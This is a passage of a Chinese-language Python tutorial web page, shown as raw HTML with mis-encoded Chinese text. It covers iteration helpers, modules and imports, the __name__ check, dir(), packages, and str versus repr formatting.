title="éå†æŠ€å·§"></a>éå†æŠ€å·§</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å…³é”®å­—å’Œå¯¹åº”çš„å€¼å¯ä»¥ä½¿ç”¨ items() æ–¹æ³•åŒæ—¶è§£è¯»</span>dict4 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'123'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'999'</span><span class="token punctuation">:</span> <span class="token string">'haha'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict4<span class="token punctuation">)</span><span class="token comment"># {'123': 'test', '999': 'haha'}</span><span class="token keyword">for</span> y<span class="token punctuation">,</span> v <span class="token keyword">in</span> dict4<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token comment"># 123 test</span><span class="token comment"># 999 haha</span><span class="token comment"># ç´¢å¼•ä½ç½®å’Œå¯¹åº”å€¼å¯ä»¥ä½¿ç”¨ enumerate() å‡½æ•°åŒæ—¶å¾—åˆ°</span>list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'111'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'999'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['111', 'test', '999']</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0 1111 test2 999'''</span><span class="token comment"># åŒæ—¶éå†ä¸¤ä¸ªæˆ–æ›´å¤šçš„åºåˆ—ï¼Œå¯ä»¥ä½¿ç”¨ zip() ç»„åˆ</span>questions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'quest'</span><span class="token punctuation">,</span> <span class="token string">'favorite color'</span><span class="token punctuation">]</span>answers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'lancelot'</span><span class="token punctuation">,</span> <span class="token string">'the holy grail'</span><span class="token punctuation">,</span> <span class="token string">'blue'</span><span class="token punctuation">]</span><span class="token keyword">for</span> q<span class="token punctuation">,</span> a <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>questions<span class="token punctuation">,</span> answers<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'What is your {0}?  It is {1}.'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''What is your name?  It is lancelot.What is your quest?  It is the holy grail.What is your favorite color?  It is blue.'''</span><span class="token comment"># åå‘è¾“å‡º, ä½¿ç”¨reversed()å‡½æ•°</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 9 7 5 3 1 </span><span class="token comment"># é¡ºåºéå†ä¸€ä¸ªåºåˆ—ï¼Œä½¿ç”¨ sorted() å‡½æ•°è¿”å›ä¸€ä¸ªå·²æ’åºçš„åºåˆ—</span>basket <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'pear'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">]</span><span class="token keyword">for</span> f <span class="token keyword">in</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>basket<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># apple banana orange pear </span><span class="token triple-quoted-string string">'''{'123': 'test', '999': 'haha'}123 test999 haha['111', 'test', '999']0 1111 test2 999What is your name?  It is lancelot.What is your quest?  It is the holy grail.What is your favorite color?  It is blue.9 7 5 3 1 apple banana orange pear '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h2><p>æ¨¡å—æ˜¯ä¸€ä¸ªåŒ…å«æ‰€æœ‰ä½ å®šä¹‰çš„å‡½æ•°å’Œå˜é‡çš„æ–‡ä»¶ï¼Œå…¶åç¼€åæ˜¯.pyï¼Œæ„æ€æ˜¯ä½ èƒ½ç›´æ¥è°ƒç”¨å†™å¥½çš„å‡½æ•°æˆ–è€…å˜é‡æ¥æ‰§è¡Œä½ çš„ä»»åŠ¡ï¼Œè¿™äº›å†™å¥½çš„å‡½æ•°å’Œå˜é‡è¢«å°è£…åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…ä¸­</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'å‘½ä»¤è¡Œå‚æ•°å¦‚ä¸‹:'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n\nPython è·¯å¾„ä¸ºï¼š'</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>import sys å¼•å…¥ python æ ‡å‡†åº“ä¸­çš„ sys.py æ¨¡å—</li><li>sys.argv æ˜¯ä¸€ä¸ªåŒ…å«å‘½ä»¤è¡Œå‚æ•°çš„åˆ—è¡¨</li><li>sys.path åŒ…å«äº†ä¸€ä¸ª Python è§£é‡Šå™¨è‡ªåŠ¨æŸ¥æ‰¾æ‰€éœ€æ¨¡å—çš„è·¯å¾„çš„åˆ—è¡¨</li></ol><h3 id="importè¯­å¥"><a href="#importè¯­å¥" class="headerlink" title="importè¯­å¥"></a>importè¯­å¥</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> module1<span class="token punctuation">[</span><span class="token punctuation">,</span> module2<span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> moduleN<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>importåªä¼šå¯¼å…¥ä¸€æ¬¡</li><li>è§£é‡Šå™¨æ”¶ç¼©è·¯å¾„æ˜¯åœ¨sys.pathä¸­ç¡®å®š</li></ol><p>åœ¨sys.pathä»»ä¸€è·¯å¾„ä¸‹åˆ›å»ºæ–‡ä»¶fibo.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æ–æ³¢é‚£å¥‘(fibonacci)æ•°åˆ—æ¨¡å—</span> <span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># å®šä¹‰åˆ° n çš„æ–æ³¢é‚£å¥‘æ•°åˆ—</span>    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>    <span class="token keyword">while</span> b <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a<span class="token operator">+</span>b    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">fib2</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># è¿”å›åˆ° n çš„æ–æ³¢é‚£å¥‘æ•°åˆ—</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>    <span class="token keyword">while</span> b <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">)</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a<span class="token operator">+</span>b    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼•å…¥æ¨¡å—ä½¿ç”¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fibo<span class="token punctuation">.</span>fib<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>fibo<span class="token punctuation">.</span>fib2<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>fib <span class="token operator">=</span> fibo<span class="token punctuation">.</span>fib <span class="token comment"># å°†å‡½æ•°èµ‹ç»™æœ¬åœ°</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="from-â€¦-import-è¯­å¥"><a href="#from-â€¦-import-è¯­å¥" class="headerlink" title="from â€¦ import è¯­å¥"></a>from â€¦ import è¯­å¥</h3><p>Python çš„ from è¯­å¥è®©ä½ ä»æ¨¡å—ä¸­å¯¼å…¥ä¸€ä¸ªæŒ‡å®šçš„éƒ¨åˆ†åˆ°å½“å‰å‘½åç©ºé—´ä¸­</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> modname <span class="token keyword">import</span> name1<span class="token punctuation">[</span><span class="token punctuation">,</span> name2<span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> nameN<span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦å¯¼å…¥æ¨¡å— fibo çš„ fib å‡½æ•°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> fibo <span class="token keyword">import</span> fib<span class="token punctuation">,</span> fib2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªå£°æ˜ä¸ä¼šæŠŠæ•´ä¸ªfiboæ¨¡å—å¯¼å…¥åˆ°å½“å‰çš„å‘½åç©ºé—´ä¸­ï¼Œå®ƒåªä¼šå°†fiboé‡Œçš„fibå‡½æ•°å¼•å…¥è¿›æ¥</p><h3 id="from-â€¦-import-è¯­å¥-1"><a href="#from-â€¦-import-è¯­å¥-1" class="headerlink" title="from â€¦ import * è¯­å¥"></a>from â€¦ import * è¯­å¥</h3><p>æŠŠä¸€ä¸ªæ¨¡å—çš„æ‰€æœ‰å†…å®¹å…¨éƒ½å¯¼å…¥åˆ°å½“å‰çš„å‘½åç©ºé—´</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> modname <span class="token keyword">import</span> <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ·±å…¥æ¨¡å¼"><a href="#æ·±å…¥æ¨¡å¼" class="headerlink" title="æ·±å…¥æ¨¡å¼"></a>æ·±å…¥æ¨¡å¼</h3><p>æ¨¡å—é™¤äº†æ–¹æ³•å®šä¹‰ï¼Œè¿˜å¯ä»¥åŒ…æ‹¬å¯æ‰§è¡Œçš„ä»£ç ã€‚è¿™äº›ä»£ç ä¸€èˆ¬ç”¨æ¥åˆå§‹åŒ–è¿™ä¸ªæ¨¡å—ã€‚è¿™äº›ä»£ç åªæœ‰åœ¨ç¬¬ä¸€æ¬¡è¢«å¯¼å…¥æ—¶æ‰ä¼šè¢«æ‰§è¡Œã€‚æ¯ä¸ªæ¨¡å—æœ‰å„è‡ªç‹¬ç«‹çš„ç¬¦å·è¡¨ï¼Œåœ¨æ¨¡å—å†…éƒ¨ä¸ºæ‰€æœ‰çš„å‡½æ•°å½“ä½œå…¨å±€ç¬¦å·è¡¨æ¥ä½¿ç”¨ã€‚</p><p>å¯¼å…¥æ¨¡å—çš„å…¨å±€å˜é‡å’Œæœ¬æ¨¡å—çš„å…¨å±€å˜é‡æ˜¯ä¸å½±å“çš„</p><h3 id="name-å±æ€§"><a href="#name-å±æ€§" class="headerlink" title="__name__å±æ€§"></a>__name__å±æ€§</h3><ol><li>ç”¨__name__å±æ€§æ¥ä½¿è¯¥ç¨‹åºå—ä»…åœ¨è¯¥æ¨¡å—è‡ªèº«è¿è¡Œæ—¶æ‰§è¡Œ</li><li>æ¯ä¸ªæ¨¡å—éƒ½æœ‰ä¸€ä¸ª__name__å±æ€§ï¼Œå½“å…¶å€¼æ˜¯â€™<strong>main</strong>â€˜æ—¶ï¼Œè¡¨æ˜è¯¥æ¨¡å—è‡ªèº«åœ¨è¿è¡Œï¼Œå¦åˆ™æ˜¯è¢«å¼•å…¥</li><li><strong><strong>name</strong></strong> ä¸ <strong><strong>main</strong></strong> åº•ä¸‹æ˜¯åŒä¸‹åˆ’çº¿ï¼Œ <strong>_ _</strong> æ˜¯è¿™æ ·å»æ‰ä¸­é—´çš„é‚£ä¸ªç©ºæ ¼</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ç¨‹åºè‡ªèº«åœ¨è¿è¡Œ'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'æˆ‘æ¥è‡ªå¦ä¸€æ¨¡å—'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">python using_name<span class="token punctuation">.</span>pyç¨‹åºè‡ªèº«åœ¨è¿è¡Œ<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">import</span> using_nameæˆ‘æ¥è‡ªå¦ä¸€æ¨¡å—<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dir-å‡½æ•°"><a href="#dir-å‡½æ•°" class="headerlink" title="dir()å‡½æ•°"></a>dir()å‡½æ•°</h3><p>å†…ç½®çš„å‡½æ•° dir() å¯ä»¥æ‰¾åˆ°æ¨¡å—å†…å®šä¹‰çš„æ‰€æœ‰åç§°ã€‚ä»¥ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨çš„å½¢å¼è¿”å›</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''['__breakpointhook__', '__displayhook__', '__doc__', '__excepthook__', '__interactivehook__', '__loader__', '__name__', '__package__', '__spec__', '__stderr__', '__stdin__', '__stdout__', '__unraisablehook__', '_base_executable', '_clear_type_cache', '_current_frames', '_debugmallocstats', '_enablelegacywindowsfsencoding', '_framework', '_getframe', '_git', '_home', '_xoptions', 'addaudithook', 'api_version', 'argv', 'audit', 'base_exec_prefix', 'base_prefix', 'breakpointhook', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dllhandle', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_origin_tracking_depth', 'getallocatedblocks', 'getcheckinterval', 'getdefaultencoding', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'getwindowsversion', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'pycache_prefix', 'set_asyncgen_hooks', 'set_coroutine_origin_tracking_depth', 'setcheckinterval', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdout', 'thread_info', 'unraisablehook', 'version', 'version_info', 'warnoptions', 'winver']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ²¡æœ‰ç»™å®šå‚æ•°ï¼Œé‚£ä¹ˆ dir() å‡½æ•°ä¼šç½—åˆ—å‡ºå½“å‰å®šä¹‰çš„æ‰€æœ‰åç§°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'i', 'sys']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ ‡å‡†æ¨¡å—"><a href="#æ ‡å‡†æ¨¡å—" class="headerlink" title="æ ‡å‡†æ¨¡å—"></a>æ ‡å‡†æ¨¡å—</h3><p>Python æœ¬èº«å¸¦ç€ä¸€äº›æ ‡å‡†çš„æ¨¡å—åº“ï¼Œæœ‰äº›æ¨¡å—ç›´æ¥è¢«æ„å»ºåœ¨è§£æå™¨é‡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>ps1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>ps2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h3><p>åŒ…æ˜¯ä¸€ç§ç®¡ç† Python æ¨¡å—å‘½åç©ºé—´çš„å½¢å¼ï¼Œé‡‡ç”¨â€ç‚¹æ¨¡å—åç§°â€ï¼Œæ¯”å¦‚ä¸€ä¸ªæ¨¡å—çš„åç§°æ˜¯ A.Bï¼Œ é‚£ä¹ˆä»–è¡¨ç¤ºä¸€ä¸ªåŒ… Aä¸­çš„å­æ¨¡å— Bï¼Œä¾‹å¦‚ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sound/                          é¡¶å±‚åŒ…      __init__.py               åˆå§‹åŒ– sound åŒ…      formats/                  æ–‡ä»¶æ ¼å¼è½¬æ¢å­åŒ…              __init__.py              wavread.py              wavwrite.py              aiffread.py              aiffwrite.py              auread.py              auwrite.py              <span class="token punctuation">..</span>.      effects/                  å£°éŸ³æ•ˆæœå­åŒ…              __init__.py              echo.py              surround.py              reverse.py              <span class="token punctuation">..</span>.      filters/                  filters å­åŒ…              __init__.py              equalizer.py              vocoder.py              karaoke.py              <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>ç›®å½•åªæœ‰åŒ…å«ä¸€ä¸ªå«åš <strong>init</strong>.py çš„æ–‡ä»¶æ‰ä¼šè¢«è®¤ä½œæ˜¯ä¸€ä¸ªåŒ…</li><li>ä½¿ç”¨å½¢å¦‚ <strong>import item.subitem.subsubitem</strong> è¿™ç§å¯¼å…¥å½¢å¼ï¼Œé™¤äº†æœ€åä¸€é¡¹ï¼Œéƒ½å¿…é¡»æ˜¯åŒ…ï¼Œè€Œæœ€åä¸€é¡¹åˆ™å¯ä»¥æ˜¯æ¨¡å—æˆ–è€…æ˜¯åŒ…ï¼Œä½†æ˜¯ä¸å¯ä»¥æ˜¯ç±»ï¼Œå‡½æ•°æˆ–è€…å˜é‡çš„åå­—ã€‚</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sound<span class="token punctuation">.</span>effects<span class="token punctuation">.</span>echo<span class="token comment"># å¯¼å…¥åŒ…é‡Œçš„ç‰¹å®šæ¨¡å—</span>sound<span class="token punctuation">.</span>effects<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>echofilter<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> delay<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> atten<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">from</span> sound<span class="token punctuation">.</span>effects <span class="token keyword">import</span> echo<span class="token comment"># å¯¼å…¥å­æ¨¡å—çš„æ–¹æ³•</span>echo<span class="token punctuation">.</span>echofilter<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> delay<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> atten<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">from</span> sound<span class="token punctuation">.</span>effects<span class="token punctuation">.</span>echo <span class="token keyword">import</span> echofilter<span class="token comment"># ç›´æ¥å¯¼å…¥ä¸€ä¸ªå‡½æ•°æˆ–è€…å˜é‡</span>echofilter<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> delay<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> atten<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">from</span> package <span class="token keyword">import</span> item<span class="token comment">#import è¯­æ³•ä¼šé¦–å…ˆæŠŠ item å½“ä½œä¸€ä¸ªåŒ…å®šä¹‰çš„åç§°ï¼Œå¦‚æœæ²¡æ‰¾åˆ°ï¼Œå†è¯•å›¾æŒ‰ç…§ä¸€ä¸ªæ¨¡å—å»å¯¼å…¥ã€‚å¦‚æœè¿˜æ²¡æ‰¾åˆ°ï¼ŒæŠ›å‡ºä¸€ä¸ª :exc:ImportError å¼‚å¸¸ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä»ä¸€ä¸ªåŒ…ä¸­å¯¼å…¥"><a href="#ä»ä¸€ä¸ªåŒ…ä¸­å¯¼å…¥" class="headerlink" title="ä»ä¸€ä¸ªåŒ…ä¸­å¯¼å…¥*"></a>ä»ä¸€ä¸ªåŒ…ä¸­å¯¼å…¥*</h3><ol><li><p>å¦‚æœåŒ…å®šä¹‰æ–‡ä»¶ <strong>_<em>init</em>_.py</strong> å­˜åœ¨ä¸€ä¸ªå«åš <strong>_<em>all</em>_</strong> çš„åˆ—è¡¨å˜é‡ï¼Œé‚£ä¹ˆåœ¨ä½¿ç”¨ <strong>from package import *</strong> çš„æ—¶å€™å°±æŠŠè¿™ä¸ªåˆ—è¡¨ä¸­çš„æ‰€æœ‰åå­—ä½œä¸ºåŒ…å†…å®¹å¯¼å…¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">__all__ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"echo"</span><span class="token punctuation">,</span> <span class="token string">"surround"</span><span class="token punctuation">,</span> <span class="token string">"reverse"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>å¦‚æœ <strong><strong>all</strong></strong> æ²¡æœ‰å®šä¹‰ï¼Œé‚£ä¹ˆä½¿ç”¨**from sound.effects import ***è¿™ç§è¯­æ³•çš„æ—¶å€™ï¼Œå°±ä¸ä¼šå¯¼å…¥åŒ… sound.effects é‡Œçš„ä»»ä½•å­æ¨¡å—</p></li><li><p>åŒ…è¿˜æä¾›ä¸€ä¸ªé¢å¤–çš„å±æ€§__path__ã€‚è¿™æ˜¯ä¸€ä¸ªç›®å½•åˆ—è¡¨ï¼Œé‡Œé¢æ¯ä¸€ä¸ªåŒ…å«çš„ç›®å½•éƒ½æœ‰ä¸ºè¿™ä¸ªåŒ…æœåŠ¡çš„__init__.py</p></li></ol><h2 id="è¾“å…¥è¾“å‡º"><a href="#è¾“å…¥è¾“å‡º" class="headerlink" title="è¾“å…¥è¾“å‡º"></a>è¾“å…¥è¾“å‡º</h2><h3 id="è¾“å…¥æ ¼å¼ç¾åŒ–"><a href="#è¾“å…¥æ ¼å¼ç¾åŒ–" class="headerlink" title="è¾“å…¥æ ¼å¼ç¾åŒ–"></a>è¾“å…¥æ ¼å¼ç¾åŒ–</h3><ol><li><code>print()</code></li><li><code>write()</code></li><li><code>sys.stdout</code>æ ‡å‡†è¾“å‡ºæ–‡ä»¶</li><li><code>str.format()</code>å¤šæ ·åŒ–</li><li><code>str()</code>ç”¨æˆ·æ˜“è¯»</li><li><code>repr</code>è§£é‡Šå™¨æ˜“è¯»</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.14285714285714285</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.14285714285714285</span>s <span class="token operator">=</span> <span class="token string">'test\nhaha'</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''testhaha'''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''testhaha'''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># reprå°†è½¬ä¹‰å­—ç¬¦å½“åšå­—ç¬¦æ‰§è¡Œ</span><span class="token comment"># 'test\nhaha'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># æ³¨æ„æ‹¬å·</span><span class="token comment"># ('test\nhaha', [1, 2])</span><span class="token comment"># repræ¥æ”¶pythonæ‰€æœ‰ç±»å‹</span><span class="token comment"># è¾“å‡ºå¹³æ–¹ä¸ç«‹æ–¹è¡¨</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span 